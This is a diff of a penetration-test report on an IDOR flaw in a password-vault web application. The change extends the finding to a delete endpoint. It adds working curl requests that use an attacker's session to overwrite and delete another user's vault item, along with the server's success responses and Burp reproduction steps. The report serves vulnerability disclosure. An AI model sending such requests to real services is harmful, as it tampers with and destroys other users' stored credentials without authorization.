@@ -302,10 +302,10 @@ Response: {"success":true,"message":"Item added successfully!"}
 **Status:** CONFIRMED
 
 ### Description
-The vault edit endpoint (`PUT /vault/edit/:itemId`) fails to properly validate user authorization. An authenticated user can modify vault items belonging to other users by directly specifying the target item ID in the URL. The application does not verify that the authenticated user owns the vault item before allowing modifications.
+The vault edit and delete endpoints fail to properly validate user authorization. An authenticated user can modify or delete vault items belonging to other users by directly specifying the target item ID in the URL. The application does not verify that the authenticated user owns the vault item before allowing modifications or deletions.
 
 ### Vulnerability Details
-- **Endpoint:** PUT /vault/edit/:itemId
+- **Endpoints:** PUT /vault/edit/:itemId, DELETE /vault/delete/:itemId
 - **Parameter:** itemId (URL path)
 - **Type:** Broken Object Level Authorization (BOLA)
 - **Authentication Required:** Yes (session-based)
@@ -315,7 +315,7 @@ The vault edit endpoint (`PUT /vault/edit/:itemId`) fails to properly validate u
 **Step 1: Identify Target Item ID**
 From vault display, note item IDs belonging to other users (e.g., item ID 1).
 
-**Step 2: Modify Another User's Item**
+**Step 2: Modify Another User's Item (Edit)**
 ```bash
 curl -X PUT http://10.0.0.10/vault/edit/1 \
   -H "Cookie: connect.sid=[session]" \
@@ -323,17 +323,29 @@ curl -X PUT http://10.0.0.10/vault/edit/1 \
   -d '{"vaulttitle":"updated title from other acc vault","vaultusername":"hacked","vaultpassword":"hacked"}'
 ```
 
-**Vulnerable Response:**
+**Step 3: Delete Another User's Item (Delete)**
+```bash
+curl -X DELETE http://10.0.0.10/vault/delete/1 \
+  -H "Cookie: connect.sid=[session]"
+```
+
+**Vulnerable Response (Edit):**
 ```json
 {"success":true,"message":"Item updated successfully!"}
 ```
 
-**Analysis:** Item ID 1 (belonging to another user) was successfully modified without authorization check. Vault display now shows the modified credentials.
+**Vulnerable Response (Delete):**
+```json
+Item deleted successfully
+```
+
+**Analysis:** Item ID 1 (belonging to another user) was successfully modified/deleted without authorization check. Vault display now shows the modified/deleted credentials.
 
 ### Impact
-- Unauthorized modification of other users' vault items
-- Credential corruption and data integrity compromise
+- Unauthorized modification or deletion of other users' vault items
+- Credential corruption, data loss, and data integrity compromise
 - Complete compromise of other users' stored data
+- Potential for account lockout or data destruction
 
 ### CVSS v3.1 Score
 **Score:** 8.8 (High)  
@@ -378,29 +390,34 @@ curl -X PUT http://10.0.0.10/vault/edit/1 \
 1. Login as victim user, navigate to vault, add an item (note the item ID from the edit link, e.g., /vault/edit/1).
 2. Logout or use incognito mode to login as attacker user.
 3. As attacker, use Burp Proxy to intercept traffic.
-4. Attempt to edit the victim's item by modifying the PUT request to /vault/edit/1 (victim's ID).
-5. Change title/username/password in the request body.
-6. Forward the request.
-7. Observe success response.
-8. Login back as victim, verify the item has been modified.
+4. Attempt to edit the victim's item by modifying the PUT request to /vault/edit/1 (victim's ID), change data, forward, observe success.
+5. Alternatively, send DELETE request to /vault/delete/1, observe "Item deleted successfully".
+6. Login back as victim, verify the item has been modified or deleted.
 
 **Screenshot 1:** Original vault item belonging to another user
 
-**Screenshot 2:** IDOR request modifying item ID of another user
+**Screenshot 2:** IDOR request modifying item ID of another user (edit or delete)
 
-**Screenshot 3:** Successful update response
+**Screenshot 3:** Successful update/delete response
 
-**Screenshot 4:** Modified vault item in victim's vault
+**Screenshot 4:** Modified/deleted vault item in victim's vault
 
 **Command Output:**
 
 ```
+# Edit IDOR
 curl -X PUT http://10.0.0.10/vault/edit/1 \
   -H "Cookie: connect.sid=[attacker_session]" \
   -H "Content-Type: application/json" \
   -d '{"vaulttitle":"hacked title","vaultusername":"hacked","vaultpassword":"hacked"}'
 
 Response: {"success":true,"message":"Item updated successfully!"}
+
+# Delete IDOR
+curl -X DELETE http://10.0.0.10/vault/delete/1 \
+  -H "Cookie: connect.sid=[attacker_session]"
+
+Response: Item deleted successfully
 ```
 
 ---
